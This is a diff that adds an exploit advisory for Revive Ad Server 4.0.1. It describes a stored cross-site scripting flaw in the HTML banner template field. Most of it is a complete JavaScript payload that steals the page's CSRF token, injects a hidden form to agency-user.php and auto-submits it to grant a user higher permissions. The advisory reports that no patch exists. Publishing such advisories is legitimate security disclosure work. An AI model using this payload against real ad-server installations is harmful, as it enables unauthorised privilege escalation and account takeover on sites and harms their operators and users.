@@ -1,0 +1,63 @@
+---------------------------------------------------------------
+# Exploit Title: XSRF Stored Revive Ad Server 4.0.1
+# Date: 24/04/2017
+# Exploit Author: Cyril Vallicari / HTTPCS / ZIWIT
+# Vendor Website : https://www.revive-adserver.com/
+# Software download : https://www.revive-adserver.com/download/
+# Version: 4.0.1
+# Tested on: Windows 7 x64 SP1 / Kali Linux
+
+
+Description :
+
+A vulnerability has been discovered in Revive Ad Server, which can be
+exploited by malicious people to conduct cross-site scripting attacks.
+When you create a banner using Generic HTML Banner, input
+
+passed via the 'htmltemplate' parameter to '/banner-edit.php' is not
+
+properly sanitised before being returned to the user (This is probably
+expected as it's an html banner). But, this can be exploited
+to execute arbitrary HTML and script code in a user's browser session in
+context of an affected site.
+
+
+This XSS vector allow to execute scripts to gather the CSRF token
+
+and submit a form to update user rights
+
+
+Here's the script :
+
+---------------------- Javascript-------------------------------
+
+var tok = document.getElementsByName('token')[0].value;
+
+var txt = '<form method="POST" id="hacked" action="agency-user.php">'
+txt += '<input type="hidden" name="submit[]" value="1"/>'
+txt += '<input type="hidden" name="token" value="' + tok + '"/>'
+txt += '<input type="hidden" name="userid" value="2"/>'
+txt += '<input type="hidden" name="email_address" value="test2@test.com"/>'
+txt += '<input type="hidden" name="agencyid" value="1"/>'
+txt += '<input type="hidden" name="permissions[]" value="10"/>'
+txt += '</form>'
+
+var d1 = document.getElementById('firstLevelContent');
+
+d1.insertAdjacentHTML('afterend', txt);
+
+document.getElementById("hacked").submit();
+
+
+---------------------- Javascript End-------------------------------
+
+(little trick to submit a form that has a "submit" parameter, just use a
+list "submit[]")
+
+This will update user rights and allow to manage accounts
+
+POC video : https://www.youtube.com/watch?v=wFuN-ADlJpM
+
+Patch : No patch yet
+
+---------------------------------------------------------------
